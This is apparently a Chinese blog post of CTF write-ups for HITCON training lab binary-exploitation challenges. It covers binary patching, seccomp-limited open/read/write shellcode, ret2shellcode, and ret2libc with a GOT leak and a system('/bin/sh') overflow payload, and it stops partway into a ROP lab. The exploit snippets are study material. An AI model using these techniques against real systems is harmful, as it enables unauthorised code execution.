<html>
<head>
<title>HITCON培训实验室-PWN题解</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
HITCON培训实验室-PWN题解
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                <span id="copyright_logo" class="rich_media_meta icon_appmsg_tag appmsg_title_tag weui-wa-hotarea">原创</span>
                                                                                            <span class="rich_media_meta rich_media_meta_text">
                                                                    Railgun
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2020-04-01</em>
                </div>

                
                                                <div id="js_tags"  class="article-tag__list" style="display: none;" data-len="0">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                    </div>
                                    </div><div id="weixin_content"><h2 style="text-align: center;" data-mpa-powered-by="yiban.io"><span style="font-size:20px;line-height:40px;;"><strong><span style="box-sizing: border-box;overflow-wrap: break-word;word-break: break-word;font family: 微软雅黑;font-size:15px;line-height:35px;;text-align: start;background-color: rgb(255, 255, 255);color: rgb(0, 153, 0);"><span style="box-sizing: border-box;font-weight: 700;overflow-wrap: break-word;word-break: break-word;line-height: 24px;">HITCON（台湾骇</span></span><span style="box-sizing: border-box;overflow-wrap: break-word;word-break: break-word;font family: 微软雅黑;font-size:15px;line-height:35px;;text-align: start;background-color: rgb(255, 255, 255);color: rgb(0, 153, 0);"><span style="box-sizing: border-box;font-weight: 700;overflow-wrap: break-word;word-break: break-word;line-height: 24px;">客年会）是台湾最大的安全技术会议，首次会议在2005年举办</span></span></strong></span></a></h2><h2 style="text-align: center;"><span style="font-size:20px;line-height:40px;;"><strong><br  /></strong></span></h2><h2 style="text-align: center;"><span style="font-size:20px;line-height:40px;;"><strong>lab1-sysmagic //patch</strong></span><span style="font-size:15px;line-height:35px;;"></span></h2><p><span style="font-size:20px;line-height:40px;;"><strong><br  /></strong></span></p><figure><img data-ratio="0.3145869947275923" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/1_eUUspRXMIg5ibzQ5X3uZzD0GaRyEzA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KSm8QaAH9t66Rnwe5Fx4AfsLMYeUUspRXMIg5ibzQ5X3uZzD0GaRyEzA/640?wx_fmt=png'" data-type="png" data-w="569" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption><span style="font-size:15px;line-height:35px;;">main</span></figcaption></figure><p><br  /></p><p><span style="font-size:15px;line-height:35px;;">进入get_flag函数看一下</span></p><figure><img data-ratio="0.881767955801105" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/2_o35OQkEIhDouFXGEuLdAZCethlBV5g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KzluyXo0MM1ib5jzmYMuPm4Rlho35OQkEIhDouFXGEuLdAZCethlBV5g/640?wx_fmt=png'" data-type="png" data-w="905" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption><span style="font-size:15px;line-height:35px;;">get_flag</span></figcaption></figure><p><span style="font-size:15px;line-height:35px;;">判断成功条件是buf==v2，这题是道简单的逆向，我们patch一下。</span></p><figure><img data-ratio="0.8253477588871716" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/3_78l0kOoOG49SeSC2FfuhiaFLNpnQOg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KFV0ibssDgLcoCEC3tMMatKhjhM78l0kOoOG49SeSC2FfuhiaFLNpnQOg/640?wx_fmt=png'" data-type="png" data-w="647" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption><span style="font-size:15px;line-height:35px;;">if判断</span></figcaption></figure><p><span style="font-size:15px;line-height:35px;;">jnz指令的意思是结果不为零则转移。</span></p><figure><img data-ratio="0.6685633001422475" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/4_JGHkTV2tbkt1WHCicOJRvPDicpHREQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KSLribjVxeTDH8dwlJAztZwVLTI9JGHkTV2tbkt1WHCicOJRvPDicpHREQ/640?wx_fmt=png'" data-type="png" data-w="703" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption><span style="font-size:15px;line-height:35px;;">改为jz即可<br style="box-sizing: inherit;"  /></span></figcaption></figure><figure><img data-ratio="0.23060796645702306" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/5_VCFKhRrbCicMnHUmRRbardViaSibUA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KuVA0e6sPMJ2htML1olB5xSpqqDicVCFKhRrbCicMnHUmRRbardViaSibUA/640?wx_fmt=png'" data-type="png" data-w="477" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><span style="font-size:15px;line-height:35px;;">可以看到判断条件改变了，Linux运行一下。</span></p><figure><img data-ratio="0.2545045045045045" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/6_Aq7eZF0woH1osianUjPyD991LZZflA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KtA92HRDbrVF3VKw3UQ4pD7GMKAq7eZF0woH1osianUjPyD991LZZflA/640?wx_fmt=png'" data-type="png" data-w="444" height="177" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;" width="696"  /><figcaption style="text-align: center;"><span style="font-size:15px;line-height:35px;;">get flag</span></figcaption></figure><hr style="box-sizing: inherit;background-color: rgba(51, 51, 51, 0.1);border-width: 0px;border-style: initial;border-color: initial;height: 1px;margin-bottom: 1.6842em;margin-left: auto;margin-right: auto;max-width: 100px;font family: &quot;Noto Serif&quot;, serif;font-size:19px;line-height:39px;;text-align: start;white-space: normal;"  /><h2 style="text-align: center;"><span style="font-size:20px;line-height:40px;;"><strong>lab2-orw //prctl(),shellcode</strong></span></h2><p><span style="font-size:20px;line-height:40px;;"><strong><br  /></strong></span></p><figure><img data-ratio="0.2890295358649789" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/7_ySkjwyKxcGFAT5WYLwiahP5BSRxuFQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KrvAXOLAhVZukE4IxI9l0Xe6osySkjwyKxcGFAT5WYLwiahP5BSRxuFQ/640?wx_fmt=png'" data-type="png" data-w="474" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><span style="font-size:15px;line-height:35px;;">可以看到，程序逻辑就是让我们输入0xC8长度的字符串，然后当作函数运行。</span></p><p><span style="font-size:15px;line-height:35px;;">发现单纯的输入shellcode并不能getshell，看到orw_seccomp这个函数被我忽略了，再去看一下。</span></p><figure><img data-ratio="0.6235632183908046" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/8_9Q3pE4pff1GTiabfGicNJBHt7scVYQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KNFAP2ibvYPBDIyMKhNibqGzTLt6O9Q3pE4pff1GTiabfGicNJBHt7scVYQ/640?wx_fmt=png'" data-type="png" data-w="348" height="230" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;" width="369"  /></figure><p><span style="font-size:15px;line-height:35px;;">有个prctl函数，陌生。</span></p><blockquote><p><span style="font-size:15px;line-height:35px;;">prctl()是用来控制进程的系统调用<br style="box-sizing: inherit;"  />在这里它限制了进程使用某些系统调用 ，所以我们不可以通过execve的shellcode来获取flag<br style="box-sizing: inherit;"  />这里我们通过 open(),read(),write()三个函数的系统调用来获取flag</span></p></blockquote><p><span style="font-size:15px;line-height:35px;;">这个prctl函数很迷，我有点搞不懂，反正我们只能靠如上三个函数来get flag了。</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="perl"><code><span class="code-snippet_outer">fp = <span class="code-snippet__keyword">open</span>(<span class="code-snippet__string">"flag"</span>,<span class="code-snippet__number">0</span>)</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">read</span>(fp,buf,<span class="code-snippet__number">0x30</span>)</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">write</span>(<span class="code-snippet__number">1</span>,buf,<span class="code-snippet__number">0x30</span>)</span></code></pre></section><figure><img data-ratio="0.4219001610305958" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/9_9pkzgCgukM7JPmDmICic2dhJRQYzIA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KrZnLt4JsEmXqibnhg7qyCd02MM9pkzgCgukM7JPmDmICic2dhJRQYzIA/640?wx_fmt=png'" data-type="png" data-w="1242" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption style="text-align: center;"><span style="font-size:15px;line-height:35px;;">get flag</span></figcaption></figure><hr style="box-sizing: inherit;background-color: rgba(51, 51, 51, 0.1);border-width: 0px;border-style: initial;border-color: initial;height: 1px;margin-bottom: 1.6842em;margin-left: auto;margin-right: auto;max-width: 100px;font family: &quot;Noto Serif&quot;, serif;font-size:19px;line-height:39px;;text-align: start;white-space: normal;"  /><h2 style="text-align: center;"><span style="font-size:20px;line-height:40px;;"><strong>lab3-re2sc //ret2shellcode</strong></span></h2><p><span style="font-size:20px;line-height:40px;;"><strong><br  /></strong></span></p><figure><img data-ratio="0.33261802575107297" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/10_khyYiartm0DgBQibCh5pwoIicTy0yg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KABnQDgXbcacNT6hicbO38pWFjlGkkhyYiartm0DgBQibCh5pwoIicTy0yg/640?wx_fmt=png'" data-type="png" data-w="466" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption><span style="font-size:15px;line-height:35px;;">main</span></figcaption></figure><p><span style="font-size:15px;line-height:35px;;">name很明显是bss段，我们可以考虑写入shellcode，然后gets溢出修改ret。</span></p><figure><img data-backh="138" data-backw="378" data-ratio="0.36507936507936506" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/11_4dQy81EKVqPXylDHhbfScM2ju9oVfQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KcYeV1F6UjZaib3xLdUfosJ6Ld4dQy81EKVqPXylDHhbfScM2ju9oVfQ/640?wx_fmt=png'" data-type="png" data-w="378" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;width: 100%;height: auto;"  /></figure><p><span style="font-size:15px;line-height:35px;;">发现getshell不成功…怀疑offset有问题，就gdb看一下：</span></p><figure><img data-ratio="0.46321525885558584" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/12_48PmzSPBoVwzwXzXPKVrKicIluYhDQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KXeoIbqlhOnxzC6hSrRB7ttn4W48PmzSPBoVwzwXzXPKVrKicIluYhDQ/640?wx_fmt=png'" data-type="png" data-w="734" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p><span style="font-size:15px;line-height:35px;;">和IDA上的不一样。</span></p><figure><img data-ratio="0.25" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/13_cvTqLtqAD8LTI5BQKxq0kdKTBP1wBg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1K8ejGibByhY3SeRKjqTaT03lJIicvTqLtqAD8LTI5BQKxq0kdKTBP1wBg/640?wx_fmt=png'" data-type="png" data-w="940" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption style="text-align: center;"><span style="font-size:15px;line-height:35px;;">get shell</span></figcaption></figure><hr style="box-sizing: inherit;background-color: rgba(51, 51, 51, 0.1);border-width: 0px;border-style: initial;border-color: initial;height: 1px;margin-bottom: 1.6842em;margin-left: auto;margin-right: auto;max-width: 100px;font family: &quot;Noto Serif&quot;, serif;font-size:19px;line-height:39px;;text-align: start;white-space: normal;"  /><h2 style="text-align: center;"><strong><span style="font-size:20px;line-height:40px;;">lab4-ret2lib //ret2libc</span></strong></h2><p><strong><span style="font-size:20px;line-height:40px;;"><br  /></span></strong></p><figure><img data-ratio="0.6462585034013606" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/14_9MNDAuicsWgt9mtm6LSIPz8wathEHA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1K6McRq2PRDNZLXEzquB4Gqypqib9MNDAuicsWgt9mtm6LSIPz8wathEHA/640?wx_fmt=png'" data-type="png" data-w="588" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption><span style="font-size:15px;line-height:35px;;">main</span></figcaption></figure><figure><img data-backh="91" data-backw="442" data-ratio="0.20588235294117646" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/15_y2KBwQqt8XWuaLSNuLh7VbPoibAoPw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KzO2FHR5PQgH0icadEKxicMSbFREy2KBwQqt8XWuaLSNuLh7VbPoibAoPw/640?wx_fmt=png'" data-type="png" data-w="442" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;width: 100%;height: auto;"  /><figcaption><span style="font-size:15px;line-height:35px;;">see_something</span></figcaption></figure><figure><img data-backh="140" data-backw="406" data-ratio="0.3448275862068966" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/16_8fe8J7yUML5fdReHkiarMUU56s1PHw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1K7PJFUL9GKG6RmjUaHT70bibZqc8fe8J7yUML5fdReHkiarMUU56s1PHw/640?wx_fmt=png'" data-type="png" data-w="406" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;width: 100%;height: auto;"  /><figcaption><span style="font-size:15px;line-height:35px;;">print_something</span></figcaption></figure><figure><img data-backh="108" data-backw="359" data-ratio="0.3008356545961003" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/17_g7LKdtLEpiaMOciasyfO5AX6G4jWbw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KgAVbTbSYibMxZNo4icwiczuWCjlPWg7LKdtLEpiaMOciasyfO5AX6G4jWbw/640?wx_fmt=png'" data-type="png" data-w="359" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;width: 100%;height: auto;"  /></figure><p><span style="font-size:15px;line-height:35px;;">程序一开始要输入一个东西，然后传入see_something打印出地址。所以我们可以用它来泄露got表的地址。</span></p><p><span style="font-size:15px;line-height:35px;;">这里需要注意，strtol的作用是将字符串转成整形。</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="makefile"><code><span class="code-snippet_outer"><span class="code-snippet__comment">###leak libc###</span></span></code><code><span class="code-snippet_outer">read_got = elf.got['read']</span></code><code><span class="code-snippet_outer">p.sendlineafter('Give me an address (in dec) :',str(read_got))</span></code><code><span class="code-snippet_outer">p.recvuntil('The content of the address : ')</span></code><code><span class="code-snippet_outer">read_addr = int(p.recv(10),16)</span></code><code><span class="code-snippet_outer">libc = LibcSearcher('read',read_addr)</span></code><code><span class="code-snippet_outer">libc_base = read_addr - libc.dump('read')</span></code></pre></section><p><span style="font-size:15px;line-height:35px;;">现在，可以利用栈溢出。</span></p><p><span style="font-size:15px;line-height:35px;;">值得注意的是直接read是无法造成栈溢出的，因为此处并没有存在漏洞，然而print_something中出现了strcpy这个函数，将我们输入的copy到栈上另一个变量中，造成了栈溢出。</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="perl"><code><span class="code-snippet_outer"><span class="code-snippet__comment">###stack overflow###</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">system</span> = libc_base + libc.dump(<span class="code-snippet__string">'system'</span>)</span></code><code><span class="code-snippet_outer">sh = libc_base + libc.dump(<span class="code-snippet__string">'str_bin_sh'</span>)</span></code><code><span class="code-snippet_outer">payload = <span class="code-snippet__string">'A'</span> * <span class="code-snippet__number">0x38</span> + <span class="code-snippet__string">'dead'</span> + p32(<span class="code-snippet__keyword">system</span>) + <span class="code-snippet__string">'beef'</span> + p32(sh)</span></code><code><span class="code-snippet_outer">p.sendlineafter(<span class="code-snippet__string">'Leave some message for me :'</span>,payload)</span></code></pre></section><figure><img data-ratio="0.4225941422594142" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/18_oicKYXeFaVuhH5pfzgKnDBfbicQZQg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KWpTxJcLhFcRV4dn6M1vb7UOjU3oicKYXeFaVuhH5pfzgKnDBfbicQZQg/640?wx_fmt=png'" data-type="png" data-w="956" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption style="text-align: center;"><span style="font-size:15px;line-height:35px;;">get shell</span></figcaption></figure><hr style="box-sizing: inherit;background-color: rgba(51, 51, 51, 0.1);border-width: 0px;border-style: initial;border-color: initial;height: 1px;margin-bottom: 1.6842em;margin-left: auto;margin-right: auto;max-width: 100px;font family: &quot;Noto Serif&quot;, serif;font-size:19px;line-height:39px;;text-align: start;white-space: normal;"  /><h2 style="text-align: center;"><span style="font-size:20px;line-height:40px;;"><strong>lab5-simplerop //rop</strong></span></h2><p><span style="font-size:20px;line-height:40px;;"><strong><br  /></strong></span></p><figure><img data-backh="143" data-backw="493" data-ratio="0.29006085192697767" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/19_QbHIW8nYvfRkubIXqiafU3lA8c8K8Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KqaSfbqFLlHpiafDecY6j2WbiapvQbHIW8nYvfRkubIXqiafU3lA8c8K8Q/640?wx_fmt=png'" data-type="png" data-w="493" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;width: 100%;height: auto;"  /><figcaption><span style="font-size:15px;line-height:35px;;">main</span></figcaption></figure><figure><img data-backh="126" data-backw="414" data-ratio="0.30434782608695654" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/20_xOecicVbaHq0hwIaAsYSgZ8QPUWxWw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1K8l2HJbDwIQngJgSFQ0McUWcjicxOecicVbaHq0hwIaAsYSgZ8QPUWxWw/640?wx_fmt=png'" data-type="png" data-w="414" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;width: 100%;height: auto;"  /><figcaption><span 